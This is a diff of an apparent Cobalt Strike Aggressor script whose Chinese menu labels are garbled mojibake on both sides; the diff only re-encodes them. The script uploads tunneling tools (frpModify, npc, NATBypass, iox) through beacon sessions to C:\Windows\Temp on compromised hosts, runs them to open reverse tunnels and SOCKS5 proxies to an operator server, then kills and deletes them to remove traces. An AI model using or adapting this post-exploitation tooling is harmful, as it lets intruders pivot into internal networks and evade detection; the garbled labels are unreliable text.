@@ -1,11 +1,11 @@
-menu "å†…ç½‘ç©¿é€" {
-	menu "frpModify(æ— éœ€frpc.iniè½åœ°)" {
-		item "ä¸Šä¼ frpc" {
+menu "ÄÚÍø´©Í¸" {
+	menu "frpModify(ÎŞĞèfrpc.iniÂäµØ)" {
+		item "ÉÏ´«frpc" {
 			$bid = $1;
-			$dialog = dialog("ä¸Šä¼ frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
-			dialog_description($dialog,"frpæŒ‡å®šå‚æ•°ç‰ˆï¼ˆæ— éœ€frpc.iniè½åœ°ï¼‰ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/frpModify");
-			drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
-			dbutton_action($dialog, "ä¸Šä¼ ");
+			$dialog = dialog("ÉÏ´«frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
+			dialog_description($dialog,"frpÖ¸¶¨²ÎÊı°æ£¨ÎŞĞèfrpc.iniÂäµØ£©¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/frpModify");
+			drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
+			dbutton_action($dialog, "ÉÏ´«");
 			dialog_show($dialog);
 		}
 		sub frp_upload {
@@ -15,13 +15,13 @@ menu "å†…ç½‘ç©¿é€" {
 				bupload($bid, script_resource("/modules/SocksProxy/x86/frpmodify.exe"));
 			}
 		}
-		item "è¿è¡Œfrpc"{
+		item "ÔËĞĞfrpc"{
 			$bid = $1['@'];
-			$Dialog = dialog("è¿è¡Œfrpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
-			dialog_description($Dialog, "è¿è¡Œfrpcï¼Œä½¿ç”¨äº†frpModifyï¼ŒæŒ‡å®šå‚æ•°å³å¯ï¼Œsocks5ç«¯å£ä¸º23333ã€‚");
+			$Dialog = dialog("ÔËĞĞfrpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
+			dialog_description($Dialog, "ÔËĞĞfrpc£¬Ê¹ÓÃÁËfrpModify£¬Ö¸¶¨²ÎÊı¼´¿É£¬socks5¶Ë¿ÚÎª23333¡£");
 			drow_text($Dialog, "ip", "ip: ");
 			drow_text($Dialog, "port", "port: ");
-			dbutton_action($Dialog, "è¿è¡Œ");
+			dbutton_action($Dialog, "ÔËĞĞ");
 			dialog_show($Dialog);
 		}
 		sub frpc_run{
@@ -30,13 +30,13 @@ menu "å†…ç½‘ç©¿é€" {
 			$port = replace($3['port'], "\"", "");
 			bshell($bid, "frpmodify.exe -t  $+ $Name -p  $+ $port");
 		}
-		item "åœæ­¢frpc"{
+		item "Í£Ö¹frpc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im frpmodift.exe");
 			}
 		}
-		item "åˆ é™¤frpc"{
+		item "É¾³ıfrpc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im frpmodift.exe & del /f /s /q frpmodify.exe");
@@ -44,25 +44,25 @@ menu "å†…ç½‘ç©¿é€" {
 		}
 	}
 
-	menu "nps(æ— é…ç½®æ–‡ä»¶è½åœ°)" {
-		item "ä¸Šä¼ npc" {
+	menu "nps(ÎŞÅäÖÃÎÄ¼şÂäµØ)" {
+		item "ÉÏ´«npc" {
 			$bid = $1;
-			$dialog = dialog("ä¸Šä¼ npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
-			dialog_description($dialog,"ä¸€æ¬¾è½»é‡çº§ã€é«˜æ€§èƒ½ã€åŠŸèƒ½å¼ºå¤§çš„å†…ç½‘ç©¿é€ä»£ç†æœåŠ¡å™¨ã€‚æ”¯æŒtcpã€udpã€socks5ã€httpç­‰å‡ ä¹æ‰€æœ‰æµé‡è½¬å‘ã€‚ä½¿ç”¨å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmgã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/ehang-io/nps");
-			drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
-			dbutton_action($dialog, "ä¸Šä¼ ");
+			$dialog = dialog("ÉÏ´«npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
+			dialog_description($dialog,"Ò»¿îÇáÁ¿¼¶¡¢¸ßĞÔÄÜ¡¢¹¦ÄÜÇ¿´óµÄÄÚÍø´©Í¸´úÀí·şÎñÆ÷¡£Ö§³Ötcp¡¢udp¡¢socks5¡¢httpµÈ¼¸ºõËùÓĞÁ÷Á¿×ª·¢¡£Ê¹ÓÃ²Î¿¼£ºhttps://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg¡£ÏîÄ¿µØÖ·£ºhttps://github.com/ehang-io/nps");
+			drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
+			dbutton_action($dialog, "ÉÏ´«");
 			dialog_show($dialog);
 		}
 		sub npc_upload {
 			bupload($bid, script_resource("/modules/SocksProxy/npc.exe"));
 		}
-		item "è¿è¡Œnpc"{
+		item "ÔËĞĞnpc"{
 			$bid = $1['@'];
-			$Dialog = dialog("è¿è¡Œnpc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
-			dialog_description($Dialog, "è¿è¡Œnpcï¼Œæ— é…ç½®æ–‡ä»¶è½åœ°ï¼Œä½¿ç”¨å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmgã€‚");
+			$Dialog = dialog("ÔËĞĞnpc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
+			dialog_description($Dialog, "ÔËĞĞnpc£¬ÎŞÅäÖÃÎÄ¼şÂäµØ£¬Ê¹ÓÃ²Î¿¼£ºhttps://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg¡£");
 			drow_text($Dialog, "server", "server: ");
 			drow_text($Dialog, "vkey", "vkey: ");
-			dbutton_action($Dialog, "è¿è¡Œ");
+			dbutton_action($Dialog, "ÔËĞĞ");
 			dialog_show($Dialog);
 		}
 		sub npc_run{
@@ -71,13 +71,13 @@ menu "å†…ç½‘ç©¿é€" {
 			$vkey = replace($3['vkey'], "\"", "");
 			bshell($bid, "npc.exe -server= $+ $server -vkey= $+ $vkey");
 		}
-		item "åœæ­¢npc"{
+		item "Í£Ö¹npc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im npc.exe");
 			}
 		}
-		item "åˆ é™¤npc"{
+		item "É¾³ınpc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im npc.exe & del /f /s /q npc.exe");
@@ -85,13 +85,13 @@ menu "å†…ç½‘ç©¿é€" {
 		}
 	}
 
-	menu "NATBypass(ç«¯å£è½¬å‘)" {
-		item "ä¸Šä¼ nb" {
+	menu "NATBypass(¶Ë¿Ú×ª·¢)" {
+		item "ÉÏ´«nb" {
 			$bid = $1;
-			$dialog = dialog("ä¸Šä¼ nb", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &nb);
-			dialog_description($dialog,"ä¸€æ¬¾lcxåœ¨golangä¸‹çš„å®ç°ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/cw1997/NATBypass");
-			drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
-			dbutton_action($dialog, "ä¸Šä¼ ");
+			$dialog = dialog("ÉÏ´«nb", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &nb);
+			dialog_description($dialog,"Ò»¿îlcxÔÚgolangÏÂµÄÊµÏÖ¡£ÏîÄ¿µØÖ·£ºhttps://github.com/cw1997/NATBypass");
+			drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
+			dbutton_action($dialog, "ÉÏ´«");
 			dialog_show($dialog);
 		}
 		sub nb {
@@ -101,13 +101,13 @@ menu "å†…ç½‘ç©¿é€" {
 				bupload($bid, script_resource("/modules/SocksProxy/x86/nb.exe"));
 			}
 		}
-		item "è¿è¡Œnb"{
+		item "ÔËĞĞnb"{
 			$bid = $1['@'];
-			$Dialog = dialog("è¿è¡Œnb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
-			dialog_description($Dialog, "vpsè¿è¡Œï¼š./nb -listen 1997 2017");
-			drow_text($Dialog, "lhost", "æœ¬åœ°IP:Port ");
-			drow_text($Dialog, "rhost", "å…¬ç½‘IP:Port ");
-			dbutton_action($Dialog, "è¿è¡Œ");
+			$Dialog = dialog("ÔËĞĞnb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
+			dialog_description($Dialog, "vpsÔËĞĞ£º./nb -listen 1997 2017");
+			drow_text($Dialog, "lhost", "±¾µØIP:Port ");
+			drow_text($Dialog, "rhost", "¹«ÍøIP:Port ");
+			dbutton_action($Dialog, "ÔËĞĞ");
 			dialog_show($Dialog);
 		}
 		sub nb_run{
@@ -116,13 +116,13 @@ menu "å†…ç½‘ç©¿é€" {
 			$rhost = replace($3['rhost'], "\"", "");
 			bshell($bid, "nb.exe -slave  $+ $lhost  $+ $rhost");
 		}
-		item "åœæ­¢nb"{
+		item "Í£Ö¹nb"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im nb.exe");
 			}
 		}
-		item "åˆ é™¤nb"{
+		item "É¾³ınb"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im nb.exe & del /f /s /q nb.exe");
@@ -130,13 +130,13 @@ menu "å†…ç½‘ç©¿é€" {
 		}
 	}
 
-	menu "iox(ç«¯å£è½¬å‘ä¸socks5)" {
-		item "ä¸Šä¼ iox" {
+	menu "iox(¶Ë¿Ú×ª·¢Óësocks5)" {
+		item "ÉÏ´«iox" {
 			$bid = $1;
-			$dialog = dialog("ä¸Šä¼ iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
-			dialog_description($dialog,"ç«¯å£è½¬å‘å·¥å…·å’Œsocks5ä»£ç†ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/EddieIvan01/iox");
-			drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
-			dbutton_action($dialog, "ä¸Šä¼ ");
+			$dialog = dialog("ÉÏ´«iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+			dialog_description($dialog,"¶Ë¿Ú×ª·¢¹¤¾ßºÍsocks5´úÀí¡£ÏîÄ¿µØÖ·£ºhttps://github.com/EddieIvan01/iox");
+			drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
+			dbutton_action($dialog, "ÉÏ´«");
 			dialog_show($dialog);
 		}
 		sub iox {
@@ -146,14 +146,14 @@ menu "å†…ç½‘ç©¿é€" {
 				bupload($bid, script_resource("/modules/SocksProxy/x86/iox.exe"));
 			}
 		}
-		item "è¿è¡Œiox(fwd)"{
+		item "ÔËĞĞiox(fwd)"{
 			$bid = $1['@'];
-			$Dialog = dialog("è¿è¡Œiox",%(lhost => "192.168.0.100:3389", rhost => "*x.x.x.x:3389", hex => "656565",bid => $bid),&iox_fwdrun);
-			dialog_description($Dialog, "vpsè¿è¡Œï¼š./iox fwd -l *3389 -l 33890 -k 656565");
-			drow_text($Dialog, "lhost", "æœ¬åœ°IP:Port ");
-			drow_text($Dialog, "rhost", "å…¬ç½‘IP:Port ");
-			drow_text($Dialog, "hex", "æµé‡åŠ å¯†å¯†é’¥: ");
-			dbutton_action($Dialog, "è¿è¡Œ");
+			$Dialog = dialog("ÔËĞĞiox",%(lhost => "192.168.0.100:3389", rhost => "*x.x.x.x:3389", hex => "656565",bid => $bid),&iox_fwdrun);
+			dialog_description($Dialog, "vpsÔËĞĞ£º./iox fwd -l *3389 -l 33890 -k 656565");
+			drow_text($Dialog, "lhost", "±¾µØIP:Port ");
+			drow_text($Dialog, "rhost", "¹«ÍøIP:Port ");
+			drow_text($Dialog, "hex", "Á÷Á¿¼ÓÃÜÃÜÔ¿: ");
+			dbutton_action($Dialog, "ÔËĞĞ");
 			dialog_show($Dialog);
 		}
 		sub iox_fwdrun{
@@ -164,13 +164,13 @@ menu "å†…ç½‘ç©¿é€" {
 			bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
 		}
 
-		item "è¿è¡Œiox(proxy)"{
+		item "ÔËĞĞiox(proxy)"{
 			$bid = $1['@'];
-			$Dialog = dialog("è¿è¡Œiox",%(rhost => "*x.x.x.x:9999", hex => "000102",bid => $bid),&iox_proxyrun);
-			dialog_description($Dialog, "vpså…ˆå»ºç«‹æœåŠ¡ï¼š./iox proxy -l *9999 -l 1080 -k 000102");
-			drow_text($Dialog, "rhost", "å…¬ç½‘IP:Port ");
-			drow_text($Dialog, "hex", "æµé‡åŠ å¯†å¯†é’¥: ");
-			dbutton_action($Dialog, "è¿è¡Œ");
+			$Dialog = dialog("ÔËĞĞiox",%(rhost => "*x.x.x.x:9999", hex => "000102",bid => $bid),&iox_proxyrun);
+			dialog_description($Dialog, "vpsÏÈ½¨Á¢·şÎñ£º./iox proxy -l *9999 -l 1080 -k 000102");
+			drow_text($Dialog, "rhost", "¹«ÍøIP:Port ");
+			drow_text($Dialog, "hex", "Á÷Á¿¼ÓÃÜÃÜÔ¿: ");
+			dbutton_action($Dialog, "ÔËĞĞ");
 			dialog_show($Dialog);
 		}
 		sub iox_proxyrun{
@@ -180,13 +180,13 @@ menu "å†…ç½‘ç©¿é€" {
 			bshell($bid, "iox.exe proxy -r  $+ $rhost -k  $+ $hex");
 		}
 
-		item "åœæ­¢iox"{
+		item "Í£Ö¹iox"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im iox.exe");
 			}
 		}
-		item "åˆ é™¤iox"{
+		item "É¾³ıiox"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im iox.exe & del /f /s /q iox.exe");
